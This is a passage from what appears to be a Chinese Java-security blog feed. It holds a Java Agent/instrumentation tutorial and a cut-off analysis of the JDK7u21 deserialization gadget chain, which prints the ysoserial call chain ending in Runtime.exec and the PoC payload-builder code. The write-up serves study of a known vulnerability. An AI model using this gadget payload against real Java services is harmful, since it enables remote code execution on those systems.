<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                      <span class="comment">&lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>com.nice0e3.Agent<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>com.nice0e3.Agent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">source</span>&gt;</span>6<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">target</span>&gt;</span>6<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译成jar包后，再建立一个项目，配置加入-javaagent参数，<code>-javaagent:out\Agent1-1.0-SNAPSHOT.jar</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619233354128-1398045893.png" alt="image-20220619233353379"></p><p>编写一个main方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main start&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;main end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果，这里可以看到打印了JVM加载的所有类。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619233501677-2145241489.png" alt="image-20220619233501086"></p><p>上面的输出结果我们能够发现：</p><ol><li>执行main方法之前会加载所有的类，包括系统类和自定义类；</li><li>在ClassFileTransformer中会去拦截系统类和自己实现的类对象；</li><li>如果你有对某些类对象进行改写，那么在拦截的时候抓住该类使用字节码编译工具即可实现。</li></ol><h5 id="transform测试"><a href="#transform测试" class="headerlink" title="transform测试"></a>transform测试</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> rickiyang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-08-06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Desc</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(<span class="keyword">final</span> ClassLoader loader, <span class="keyword">final</span> String className, <span class="keyword">final</span> Class&lt;?&gt; classBeingRedefined,<span class="keyword">final</span> ProtectionDomain protectionDomain, <span class="keyword">final</span> <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="comment">// 操作Date类</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;java/util/Date&quot;</span>.equals(className)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 从ClassPool获得CtClass对象</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;java.util.Date&quot;</span>);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">convertToAbbr</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;convertToAbbr&quot;</span>);</span><br><span class="line">                <span class="comment">//这里对 java.util.Date.convertToAbbr() 方法进行了改写，在 return之前增加了一个 打印操作</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">methodBody</span> <span class="operator">=</span> <span class="string">&quot;&#123;sb.append(Character.toUpperCase(name.charAt(0)));&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;sb.append(name.charAt(1)).append(name.charAt(2));&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;System.out.println(\&quot;sb.toString()\&quot;);&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;return sb;&#125;&quot;</span>;</span><br><span class="line">                convertToAbbr.setBody(methodBody);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 返回字节码，并且detachCtClass对象</span></span><br><span class="line">                <span class="type">byte</span>[] byteCode = clazz.toBytecode();</span><br><span class="line">                <span class="comment">//detach的意思是将内存中曾经被javassist加载过的Date对象移除，如果下次有需要在内存中找不到会重新走javassist加载</span></span><br><span class="line">                clazz.detach();</span><br><span class="line">                <span class="keyword">return</span> byteCode;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果返回null则字节码不会被修改</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="JVM启动后运行"><a href="#JVM启动后运行" class="headerlink" title="JVM启动后运行"></a>JVM启动后运行</h4><p>上面介绍的Instrumentation是在JDK1.5中提供的，开发者只能在main加载之前添加手脚，在Java SE 6的Instrumentation当中，提供了一个新的代理操作方法：agentmain，可以在main函数开始运行之后再运行。</p><p>跟premain函数一样，开发者可以编写一个含有agentmain函数的Java类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 采用attach机制，被代理的目标程序VM有可能很早之前已经启动，当然其所有类已经被加载完成，这个时候需要借助Instrumentation#retransformClasses(Class&lt;?&gt;... classes)让对应的类可以重新转换，从而激活重新转换的类执行ClassFileTransformer列表中的回调</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure><p>同样，agentmain方法中带Instrumentation参数的方法也比不带优先级更高。开发者必须在manifest文件里面设置“Agent-Class”来指定包含agentmain函数的类。</p><p>在Java JDK6以后实现启动后加载<code>Instrument</code>的是<code>Attach api</code>。存在于<code>com.sun.tools.attach</code>里面有两个重要的类。</p><p>来查看一下该包中的内容，这里有两个比较重要的类，分别是<code>VirtualMachine</code>和<code>VirtualMachineDescriptor</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620000021184-715292334.png" alt="image-20220620000020624"></p><h5 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h5><p><code>VirtualMachine</code>可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用</p><p><strong>Attach</strong> ：从 JVM 上面解除一个代理等方法，可以实现的功能可以说非常之强大 。该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p><p><strong>loadAgent</strong>：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。</p><p><strong>Detach</strong>：从 JVM 上面解除一个代理(agent)</p><h5 id="VirtualMachineDescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h5><p>则是一个描述虚拟机的容器类，配合<code>VirtualMachine</code>类完成各种功能。</p><h5 id="attach实现动态注入的原理"><a href="#attach实现动态注入的原理" class="headerlink" title="attach实现动态注入的原理"></a>attach实现动态注入的原理</h5><p>通过VirtualMachine类的attach(pid)方法，便可以attach到一个运行中的java进程上，之后便可以通过loadAgent(agentJarPath)来将agent的jar包注入到对应的进程，然后对应的进程会调用agentmain方法。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620000747337-50578901.png" alt="image-20220620000746585"></p><p>既然是两个进程之间通信那肯定的建立起连接，VirtualMachine.attach动作类似TCP创建连接的三次握手，目的就是搭建attach通信的连接。而后面执行的操作，例如vm.loadAgent，其实就是向这个socket写入数据流，接收方target VM会针对不同的传入数据来做不同的处理。</p><h4 id="agentmain测试"><a href="#agentmain测试" class="headerlink" title="agentmain测试"></a>agentmain测试</h4><p>工程结构和 上面premain的测试一样，编写AgentMainTest，然后使用maven插件打包 生成MANIFEST.MF。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransFormer</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DefineTransFormer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;post agent load class : &quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包生成jar包，编写测试main方法。的步骤是：从一个attach JVM去探测目标JVM，如果目标JVM存在则向它发送agent.jar。我测试写的简单了些，找到当前JVM并加载agent.jar。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取当前系统中所有 运行中的 虚拟机</span></span><br><span class="line">        System.out.println(<span class="string">&quot;running JVM start &quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;</span><br><span class="line">            <span class="comment">//如果虚拟机的名称为 xxx 则 该虚拟机为目标虚拟机，获取该虚拟机的 pid</span></span><br><span class="line">            <span class="comment">//然后加载 agent.jar 发送给该虚拟机</span></span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().endsWith(<span class="string">&quot;AgentTest&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;D:\\code\\java1\\AgentTest2\\out\\AgentTest-1.0-SNAPSHOT.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>list()方法会去寻找当前系统中所有运行着的JVM进程，通过vmd.displayName()看到当前系统都有哪些JVM进程在运行。因为main函数执行起来的时候进程名为当前类名，所以通过这种方式可以去找到当前的进程id。</p><p>执行结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220620001805996-1965653405.png" alt="image-20220620001805482"></p><h3 id="Instrumentation的局限性"><a href="#Instrumentation的局限性" class="headerlink" title="Instrumentation的局限性"></a>Instrumentation的局限性</h3><p>大多数情况下，我们使用Instrumentation都是使用其字节码插桩的功能，或者笼统说就是类重定义(Class Redefine)的功能，但是有以下的局限性：</p><ol><li>premain和agentmain两种方式修改字节码的时机都是类文件加载之后，也就是说必须要带有Class类型的参数，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</li><li>类的字节码修改称为类转换(Class Transform)，类转换其实最终都回归到类重定义Instrumentation#redefineClasses()方法，此方法有以下限制：</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://juejin.cn/post/7017781194481729549">https://juejin.cn/post/7017781194481729549</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14086165.html">https://www.cnblogs.com/nice0e3/p/14086165.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;Java-Agent简介&quot;&gt;&lt;a href=&quot;#Java-Agent简介&quot; class=&quot;headerlink&quot; title=&quot;Java Agent简介&quot;&gt;&lt;/a&gt;Java Agent简介&lt;/h3&gt;&lt;p&gt;JavaAgent 是 JDK1.5 之后引入的新特性，此特性为用户提供了在 JVM 将字节码文件读入内存之后，JVM 使用对应的字节流在 Java 堆中生成一个 Class 对象之前，用户可以对其字节码进行修改的能力，从而 JVM 也将会使用用户修改过之后的字节码进行 Class 对象的创建。Java Agent可以去实现字节码插桩、动态跟踪分析等。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java Agent" scheme="https://kpa1on.github.io/tags/Java-Agent/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Jdk7u21链分析</title>
    <link href="https://kpa1on.github.io/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJdk7u21%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BJdk7u21%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2022-06-17T15:47:06.000Z</published>
    <updated>2022-06-18T14:14:30.065Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前面的cc链都是第三方组件的利用链，现在学习下JDK7u21的原生反序列化链。</p><span id="more"></span><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>JDK7u21这个版本以及之前时间发布的所有Java版本都有问题。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618000917681-667491552.png" alt="image-20220618000915777"></p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>引入<code>javassist</code>，下面用到<code>javassist</code>就是为了方便生成恶意类的字节码，而且版本要低一些，高版本不兼容jdk7，只能用jdk8及其更高版本。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;<span class="number">7</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;<span class="number">7</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">&lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>7u21这条链核心就在于<code>AnnotationInvocationHandler</code>这个类。联想到CC1的时候第一次接触它，这个类有两种利用思路，一种是利用它的<code>readObject()</code>，另一种就是利用它的<code>invoke()</code>，因为<code>AnnotationInvocationHandler</code>是一个实现了<code>InvocationHandler</code>接口的类，可以应用于动态代理中。</p><p>看下yso中给出的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (<span class="number">0</span>)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看下yso中的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">zeroHashCodeStr</span> <span class="operator">=</span> <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">tempHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line"><span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br><span class="line"></span><br><span class="line"><span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>(); <span class="comment">// maintain order</span></span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(proxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_auxClasses&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">map.put(zeroHashCodeStr, templates); <span class="comment">// swap in real object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> set;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure><p>进到方法中</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618173503665-1663655389.png" alt="image-20220618173503107"></p><p>最后调用了它的重载方法，方法中，首先对传入的<code>TemplatesImpl</code>进行了实例化，然后用<code>javassist</code>动态创建了一个恶意类</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618173822265-841791307.png" alt="image-20220618173821584"></p><p>最后这段代码使用了<code>Reflections.setFieldValue</code>把<code>templates</code>里面的<code>_bytecodes</code>设置为前面动态创建的类的字节码。</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618180930411-355270625.png" alt="image-20220618180929673"></p><p><code>setFieldValue()</code>是通过反射去实现的</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618181515069-1298862479.png" alt="image-20220618181513584"></p><p>继续往下看</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182655940-1693753912.png" alt="image-20220618182654963"></p><p>查看一下<code>Reflections.getFirstCtor</code>方法，内部就是使用反射创建一个无参构造的对象</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182812273-1966081817.png" alt="image-20220618182811857"></p><p>传递的name就是<code>AnnotationInvocationHandler</code></p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618182952528-91648397.png" 